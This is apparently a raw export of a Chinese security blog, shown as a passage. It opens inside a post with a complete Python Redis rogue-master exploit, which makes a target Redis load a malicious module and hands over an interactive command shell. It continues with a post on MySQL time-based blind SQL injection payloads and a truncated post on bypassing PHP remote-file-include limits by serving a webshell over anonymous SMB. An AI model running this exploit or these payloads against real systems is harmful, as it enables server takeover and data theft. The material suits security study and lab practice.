class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">CRLF=<span class="string">"\r\n"</span></span><br><span class="line">payload=open(<span class="string">"exp.so"</span>,<span class="string">"rb"</span>).read()</span><br><span class="line">exp_filename=<span class="string">"exp.so"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span><span class="params">(arr)</span>:</span></span><br><span class="line"><span class="keyword">global</span> CRLF</span><br><span class="line"><span class="keyword">global</span> payload</span><br><span class="line">redis_arr=arr.split(<span class="string">" "</span>)</span><br><span class="line">cmd=<span class="string">""</span></span><br><span class="line">cmd+=<span class="string">"*"</span>+str(len(redis_arr))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">cmd+=CRLF+<span class="string">"$"</span>+str(len(x))+CRLF+x</span><br><span class="line">cmd+=CRLF</span><br><span class="line"><span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_connect</span><span class="params">(rhost,rport)</span>:</span></span><br><span class="line">sock=socket.socket()</span><br><span class="line">sock.connect((rhost,rport))</span><br><span class="line"><span class="keyword">return</span> sock</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(sock,cmd)</span>:</span></span><br><span class="line">sock.send(redis_format(cmd))</span><br><span class="line">print(sock.recv(<span class="number">1024</span>).decode(<span class="string">"utf-8"</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">interact_shell</span><span class="params">(sock)</span>:</span></span><br><span class="line">flag=<span class="literal">True</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">while</span> flag:</span><br><span class="line">shell=raw_input(<span class="string">"\033[1;32;40m[*]\033[0m "</span>)</span><br><span class="line">shell=shell.replace(<span class="string">" "</span>,<span class="string">"${IFS}"</span>)</span><br><span class="line"><span class="keyword">if</span> shell==<span class="string">"exit"</span> <span class="keyword">or</span> shell==<span class="string">"quit"</span>:</span><br><span class="line">flag=<span class="literal">False</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">send(sock,<span class="string">"system.exec {}"</span>.format(shell))</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RogueServer</span><span class="params">(lport)</span>:</span></span><br><span class="line"><span class="keyword">global</span> CRLF</span><br><span class="line"><span class="keyword">global</span> payload</span><br><span class="line">flag=<span class="literal">True</span></span><br><span class="line">result=<span class="string">""</span></span><br><span class="line">sock=socket.socket()</span><br><span class="line">sock.bind((<span class="string">"0.0.0.0"</span>,lport))</span><br><span class="line">sock.listen(<span class="number">10</span>)</span><br><span class="line">clientSock, address = sock.accept()</span><br><span class="line"><span class="keyword">while</span> flag:</span><br><span class="line">data = clientSock.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">"PING"</span> <span class="keyword">in</span> data:</span><br><span class="line">result=<span class="string">"+PONG"</span>+CRLF</span><br><span class="line">clientSock.send(result)</span><br><span class="line">flag=<span class="literal">True</span></span><br><span class="line"><span class="keyword">elif</span> <span class="string">"REPLCONF"</span> <span class="keyword">in</span> data:</span><br><span class="line">result=<span class="string">"+OK"</span>+CRLF</span><br><span class="line">clientSock.send(result)</span><br><span class="line">flag=<span class="literal">True</span></span><br><span class="line"><span class="keyword">elif</span> <span class="string">"PSYNC"</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">"SYNC"</span> <span class="keyword">in</span> data:</span><br><span class="line">result = <span class="string">"+FULLRESYNC "</span> + <span class="string">"a"</span> * <span class="number">40</span> + <span class="string">" 1"</span> + CRLF</span><br><span class="line">result += <span class="string">"$"</span> + str(len(payload)) + CRLF</span><br><span class="line">result = result.encode()</span><br><span class="line">result += payload</span><br><span class="line">result += CRLF</span><br><span class="line">clientSock.send(result)</span><br><span class="line">flag=<span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">lhost=<span class="string">"192.168.163.132"</span></span><br><span class="line">lport=<span class="number">6666</span></span><br><span class="line">rhost=<span class="string">"192.168.163.128"</span></span><br><span class="line">rport=<span class="number">6379</span></span><br><span class="line">passwd=<span class="string">""</span></span><br><span class="line">redis_sock=redis_connect(rhost,rport)</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">send(redis_sock,<span class="string">"AUTH {}"</span>.format(passwd))</span><br><span class="line">send(redis_sock,<span class="string">"SLAVEOF {} {}"</span>.format(lhost,lport))</span><br><span class="line">send(redis_sock,<span class="string">"config set dbfilename {}"</span>.format(exp_filename))</span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line">RogueServer(lport)</span><br><span class="line">send(redis_sock,<span class="string">"MODULE LOAD ./{}"</span>.format(exp_filename))</span><br><span class="line">interact_shell(redis_sock)</span><br></pre></td></tr></tbody></table></figure><p></p><p>效果图</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712154011-4783cdd2-a478-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://redis.io/topics/protocol" title="https://redis.io/topics/protocol" target="_blank" rel="noopener">https://redis.io/topics/protocol</a><br><a href="https://www.cnblogs.com/kismetv/p/9236731.html#t1" title="https://www.cnblogs.com/kismetv/p/9236731.html#t1" target="_blank" rel="noopener">https://www.cnblogs.com/kismetv/p/9236731.html#t1</a><br><a href="http://duqingfeng.net/2018/06/08/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E2%80%94%E2%80%94%E5%85%A8%E9%87%8F%E5%A4%8D%E5%88%B6%E4%B8%8E%E5%A2%9E%E9%87%8F%E5%A4%8D%E5%88%B6%E6%80%BB%E7%BB%93/" title="http://duqingfeng.net/2018/06/08/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E2%80%94%E2%80%94%E5%85%A8%E9%87%8F%E5%A4%8D%E5%88%B6%E4%B8%8E%E5%A2%9E%E9%87%8F%E5%A4%8D%E5%88%B6%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">http://duqingfeng.net/2018/06/08/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E2%80%94%E2%80%94%E5%85%A8%E9%87%8F%E5%A4%8D%E5%88%B6%E4%B8%8E%E5%A2%9E%E9%87%8F%E5%A4%8D%E5%88%B6%E6%80%BB%E7%BB%93/</a><br><a href="https://www.cnblogs.com/hongmoshui/p/10594639.html" title="https://www.cnblogs.com/hongmoshui/p/10594639.html" target="_blank" rel="noopener">https://www.cnblogs.com/hongmoshui/p/10594639.html</a><br><a href="https://xz.aliyun.com/t/5616" title="https://xz.aliyun.com/t/5616" target="_blank" rel="noopener">https://xz.aliyun.com/t/5616</a><br><a href="https://joychou.org/web/hackredis-enhanced-edition-script.html" title="https://joychou.org/web/hackredis-enhanced-edition-script.html" target="_blank" rel="noopener">https://joychou.org/web/hackredis-enhanced-edition-script.html</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL中延时注入的5种姿势</title>
      <link href="/2019/06/26/mysql%E4%B8%AD%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5%E7%9A%845%E7%A7%8D%E5%A7%BF%E5%8A%BF/"/>
      <url>/2019/06/26/mysql%E4%B8%AD%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5%E7%9A%845%E7%A7%8D%E5%A7%BF%E5%8A%BF/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>延时注入无论是在实战中还是在CTF中还是比较常见的，下面我总结一下延时注入的一些套路</p><h1 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h1><h2 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h2><p>最简单直接准确的方式是用<code>sleep</code><br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select sleep(5);</span><br><span class="line">+----------+</span><br><span class="line">| sleep(5) |</span><br><span class="line">+----------+</span><br><span class="line">|        0 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (5.00 sec)</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="benchmark"><a href="#benchmark" class="headerlink" title="benchmark"></a>benchmark</h2><p>通过执行多次表达式，以达到延时的效果。<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select benchmark(10000000,md5(1));</span><br><span class="line">+----------------------------+</span><br><span class="line">| benchmark(10000000,md5(1)) |</span><br><span class="line">+----------------------------+</span><br><span class="line">|                          0 |</span><br><span class="line">+----------------------------+</span><br><span class="line">1 row in set (2.20 sec)</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="reDos"><a href="#reDos" class="headerlink" title="reDos"></a>reDos</h2><blockquote><p>利用正则表达式的回溯机制</p></blockquote><h3 id="正则表达式的两种引擎"><a href="#正则表达式的两种引擎" class="headerlink" title="正则表达式的两种引擎"></a>正则表达式的两种引擎</h3><p>正则表达式的常见引擎可以大致分为两种：</p><ol><li>DFA（确定型有穷自动机）</li><li>NFA（非确定型有穷自动机）</li></ol><p>特点<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DFA的特点是只对字符串扫描一次，并且会保证返回一个目标字符串里面的最长匹配，不支持字符串进行回溯</span><br><span class="line">NFA最大的特点是回溯机制，会对字符串进行多次扫描匹配</span><br></pre></td></tr></tbody></table></figure><p></p><p>他们匹配的过程为:</p><ul><li>DFA：用字符串去匹配正表达式，从开始状态一个一个去匹配字符，如果字符匹配正确就会吞入这字符，如果匹配不上则会吐出这个字符，然后继续往下匹配，直到正则表达式全部匹配完成或者匹配失败</li><li>NFA：用正则表达式去匹配字符，每吞入一个字符就会和正则表达式做比较，如果匹配正确就会继续往下匹配，如果匹配失败，则会进行回溯，尝试其它状态，直到正则表达式全部匹配完成或者匹配失败</li></ul><p>由于<code>NFA</code>存在回溯机制，所以<code>NFA</code>效率会低于<code>DFA</code>，但是<code>NFA</code>的功能却比<code>DFA</code>的多，所以现在大多数编程语言中都是使用<code>NFA</code>作为正则引擎。</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>我们用一个这样子的正则表达式<code>&lt;a&gt;(.*)&lt;/a&gt;</code>去匹配<code>&lt;a&gt;testtesttest&lt;/a&gt;</code>，这个正表达式一上来就匹配到了<code>&lt;a&gt;</code>，到后面由于<code>（.*）</code>（贪婪模式）的存在，正则引擎会着急地吞掉后面的所有字符，不过由于该正则表达式还有要匹配的内容即<code>&lt;/a&gt;</code>，所以正则表达式会尝试匹配<code>&lt;</code>，它在字符串末尾匹配不成功，所以它每次回溯一个字符，继续尝试匹配<code>&lt;</code>，直到匹配到<code>&lt;/a&gt;</code>的<code>&lt;</code>，然后它再继续匹配<code>/</code>，以此类推下去。</p><p>图为正则表达式的执行过程，可以明显发现该正则表达式回溯了4次。<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190627131932-259b5412-989b-1.gif" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p></p><p>如果正则表达式的回溯次数过多时候，就会占用服务器大量的资源从而造成<code>reDos</code>的情况。</p><h3 id="小试一波"><a href="#小试一波" class="headerlink" title="小试一波"></a>小试一波</h3><p>———————————————————–分割线——————————————————————————————–</p><p>2019/6/28更新，我之前一直以为mysql的<code>reDos</code>是因为它的正则引擎是<code>nfa</code>，但是通过查了一波资料和本地操作，发现并不是这样子的，mysql并没有回溯，而是由于填充了大量的字符和大量的<code>pattern</code>，导致mysql消耗大量的资源从而出现延时的情况，我们用<code>php</code>和<code>mysql</code>对比一下就知道了，用同样的正则表达式，php延时了，而mysql并没有延时。<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190629073909-eccc5744-99fd-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190629073922-f49c7404-99fd-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>———————————————————–分割线——————————————————————————————–<br>那我们在mysql中尝试一波吧。<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select rpad('a',10000000,'a') regexp concat(repeat('(a.*)+',1000),'b');</span><br><span class="line">+-----------------------------------------------------------------+</span><br><span class="line">| rpad('a',10000000,'a') regexp concat(repeat('(a.*)+',1000),'b') |</span><br><span class="line">+-----------------------------------------------------------------+</span><br><span class="line">|                                                            NULL |</span><br><span class="line">+-----------------------------------------------------------------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br></pre></td></tr></tbody></table></figure><p></p><p>但是我们发现并没有延时，细心的同学可能会发现那个有一个<code>warning</code>，我们把警告打开一下看看是哪里出问题了。<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; \W</span><br><span class="line">Show warnings enabled.</span><br><span class="line">mysql&gt; select rpad('a',10000000,'a') regexp concat(repeat('(a.*)+',1000),'b');</span><br><span class="line">+-----------------------------------------------------------------+</span><br><span class="line">| rpad('a',10000000,'a') regexp concat(repeat('(a.*)+',1000),'b') |</span><br><span class="line">+-----------------------------------------------------------------+</span><br><span class="line">|                                                            NULL |</span><br><span class="line">+-----------------------------------------------------------------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">Warning (Code 1301): Result of rpad() was larger than max_allowed_packet (1048576) - truncated</span><br></pre></td></tr></tbody></table></figure><p></p><p>发现是<code>mysql</code>设置允许接受的最大数据包大小是<code>1M</code>，而我们上面填充的字符明显超过了<code>1M</code>，所以会出现一个<code>warning</code>。<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show VARIABLES like 'max_allowed_packet';</span><br><span class="line">+--------------------+---------+</span><br><span class="line">| Variable_name      | Value   |</span><br><span class="line">+--------------------+---------+</span><br><span class="line">| max_allowed_packet | 1048576 |</span><br><span class="line">+--------------------+---------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br></pre></td></tr></tbody></table></figure><p></p><p>然后我们我要匹配把字符改小一点尝试一波，可以明显地发现延时了3.29秒<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select rpad('a',100000,'a') regexp concat(repeat('(a.*)+',1000),'b');</span><br><span class="line">+---------------------------------------------------------------+</span><br><span class="line">| rpad('a',100000,'a') regexp concat(repeat('(a.*)+',1000),'b') |</span><br><span class="line">+---------------------------------------------------------------+</span><br><span class="line">|                                                             0 |</span><br><span class="line">+---------------------------------------------------------------+</span><br><span class="line">1 row in set (3.29 sec)</span><br></pre></td></tr></tbody></table></figure><p></p><p>或者我们也可以把<code>max_allowed_packet</code>改大一点<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; set global max_allowed_packet = 20*1024*1024;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">...中间省略...</span><br><span class="line">mysql&gt; select rpad('a',1000000,'a') regexp concat(repeat('(a.*)+',1000),'b');</span><br><span class="line">+----------------------------------------------------------------+</span><br><span class="line">| rpad('a',1000000,'a') regexp concat(repeat('(a.*)+',1000),'b') |</span><br><span class="line">+----------------------------------------------------------------+</span><br><span class="line">|                                                              0 |</span><br><span class="line">+----------------------------------------------------------------+</span><br><span class="line">1 row in set (31.99 sec)</span><br></pre></td></tr></tbody></table></figure><p></p><p>成功延时了31秒。</p><h2 id="笛卡尔积"><a href="#笛卡尔积" class="headerlink" title="笛卡尔积"></a>笛卡尔积</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>笛卡儿积（来自百度百科）<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">笛卡尔乘积是指在数学中，两个集合X和Y的笛卡尓积（Cartesian product），又称直积，表示为X × Y，第一个对象是X的成员而第二个对象是Y的所有可能有序对的其中一个成员</span><br></pre></td></tr></tbody></table></figure><p></p><p>举个例子<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">假设集合A={a, b}，集合B={0, 1, 2}，那么这两个集合的笛卡尔积为{(a, 0), (a, 1), (a, 2), (b, 0), (b, 1), (b, 2)}。</span><br></pre></td></tr></tbody></table></figure><p></p><p>在mysql中如果多表查询使用不恰当时就会出现笛卡儿积现象，在多表查询中如果两张或者多张表的数据量都比较大的话，就会占用很大空间资源从而出现延时的情况。</p><h3 id="小试一波-1"><a href="#小试一波-1" class="headerlink" title="小试一波"></a>小试一波</h3><p>既然我们已经了解笛卡尔积会造成占用大量资源的情况，那我们现在mysql来尝试一波吧。<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select count(*) from information_schema.tables A, information_schema.tables B,information_schema.tables C;</span><br><span class="line">+----------+</span><br><span class="line">| count(*) |</span><br><span class="line">+----------+</span><br><span class="line">| 80621568 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (3.39 sec)</span><br></pre></td></tr></tbody></table></figure><p></p><p>可以很明显地看到延时了3s，我们还可以延时更久<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select count(*) from information_schema.tables A, information_schema.tables B,information_schema.columns C;</span><br><span class="line">+-----------+</span><br><span class="line">| count(*)  |</span><br><span class="line">+-----------+</span><br><span class="line">| 891689472 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (36.99 sec)</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="利用mysql的共享锁"><a href="#利用mysql的共享锁" class="headerlink" title="利用mysql的共享锁"></a>利用mysql的共享锁</h2><h3 id="get-lock"><a href="#get-lock" class="headerlink" title="get_lock"></a>get_lock</h3><p>先来看一波<code>get_lock</code>的语法<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get_lock(key, timeout)</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>get_lock</code>会按照<code>key</code>来加锁，当其它的客户端（session）再以同样的<code>key</code>加锁时就会处于等待状态，如果在等待期间（timeout）内获取到锁，则返回1；如果在timeout时间后获取不到锁，则返回0；如果发生错误，则返回一个<code>NULL</code>。</p><h3 id="mysql-pconnect"><a href="#mysql-pconnect" class="headerlink" title="mysql_pconnect"></a>mysql_pconnect</h3><p>不过这种方法比较局限，在<code>php</code>中它必须用<code>mysql_pconnect()</code>函数连接数据库才可以</p><p><code>mysql_pconnect</code>的定义（来自<code>w3cschool</code>）<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_pconnect() 函数打开一个到 MySQL 服务器的持久连接。</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>mysql_pconnect()</code>和 <code>mysql_connect()</code>非常相似，但有两个主要区别：<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 当连接的时候本函数将先尝试寻找一个在同一个主机上用同样的用户名和密码已经打开的（持久）连接，如果找到，则返回此连接标识而不打开新连接。</span><br><span class="line">2. 其次，当脚本执行完毕后到 SQL 服务器的连接不会被关闭，此连接将保持打开以备以后使用（mysql_close() 不会关闭由 mysql_pconnect() 建立的连接）。</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="小试一波-2"><a href="#小试一波-2" class="headerlink" title="小试一波"></a>小试一波</h3><p>session A<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select get_lock("test",5);</span><br><span class="line">+--------------------+</span><br><span class="line">| get_lock("test",5) |</span><br><span class="line">+--------------------+</span><br><span class="line">|                  1 |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></tbody></table></figure><p></p><p>session B<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select get_lock("test",5);</span><br><span class="line">+--------------------+</span><br><span class="line">| get_lock("test",5) |</span><br><span class="line">+--------------------+</span><br><span class="line">|                  0 |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (5.00 sec)</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190627122236-311119b0-9893-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>可以明显地看到另外一个<code>session</code>延时了5秒。</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.jianshu.com/p/458c246d79d4" title="https://www.jianshu.com/p/458c246d79d4" target="_blank" rel="noopener">https://www.jianshu.com/p/458c246d79d4</a><br><a href="http://www.w3school.com.cn/php/func_mysql_pconnect.asp" title="http://www.w3school.com.cn/php/func_mysql_pconnect.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/php/func_mysql_pconnect.asp</a><br><a href="https://www.cnblogs.com/cobbliu/p/3817370.html" title="https://www.cnblogs.com/cobbliu/p/3817370.html" target="_blank" rel="noopener">https://www.cnblogs.com/cobbliu/p/3817370.html</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 一些姿势 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bypass-RFI限制的一些思路</title>
      <link href="/2019/05/15/bypass-RFI%E9%99%90%E5%88%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF/"/>
      <url>/2019/05/15/bypass-RFI%E9%99%90%E5%88%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>下面介绍的两个姿势都是先知群里面get到的，这里记录一下，给先知的师傅们倒茶。</p><h1 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h1><p>假设我们有一个这样的代码<br></p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">"shell"</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>我们发现通过<code>phpinfo</code>发现<code>allow_url_fopen=Off</code>和<code>allow_url_include=Off</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190514222028-6c58eb54-7653-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>用常规的方法直接包含一个远程文件肯定是不行的</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190514223651-b6220bf6-7655-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>所以我们得想办法绕过<code>allow_url_fopen=Off</code>和<code>allow_url_include=Off</code>的限制</p><h2 id="第一种姿势：利用SMB文件共享服务"><a href="#第一种姿势：利用SMB文件共享服务" class="headerlink" title="第一种姿势：利用SMB文件共享服务"></a>第一种姿势：利用<code>SMB</code>文件共享服务</h2><p>对于PHP而言即使<code>allow_url_include</code>和<code>allow_url_fopen</code>都设置为<code>Off</code>，PHP也会加载SMB URL。所以我们可以配合<code>SMB</code>远程加载我们的<code>webshell</code>，我们同时要设置<code>SMB</code>共享服务器允许外部访问我们的<code>webshell</code>文件，所以我们需要配置一个具有匿名浏览访问权限的SMB服务器，一旦受害者尝试访问我们的<code>SMB</code>服务器上的<code>webshell</code>，我们的<code>SMB</code>服务器将不会请求任何凭证，受害者就会包含我们的<code>SMB</code>服务器上的webshell文件</p><h3 id="SAMBA服务器配置"><a href="#SAMBA服务器配置" class="headerlink" title="SAMBA服务器配置"></a>SAMBA服务器配置</h3><blockquote><p>Samba是在Linux和UNIX系统上实现SMB协议的一个软件</p></blockquote><p>安装SAMBA<br></p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install samba</span><br></pre></td></tr></tbody></table></figure><p></p><p>创建SMB共享目录<br></p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /var/www/html/share/</span><br></pre></td></tr></tbody></table></figure><p></p><p>配置新创建的SMB共享目录的权限<br></p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 0555 /var/www/html/share/</span><br><span class="line">chown -R nobody:nogroup /var/www/html/share/</span><br></pre></td></tr></tbody></table></figure><p></p><p>清空<code>/etc/samba/smb.conf</code>文件中的内容<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &gt; /etc/samba/smb.conf</span><br></pre></td></tr></tbody></table></figure><p></p><p>将下面内容粘贴到<code>/etc/samba/smb.conf</code><br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 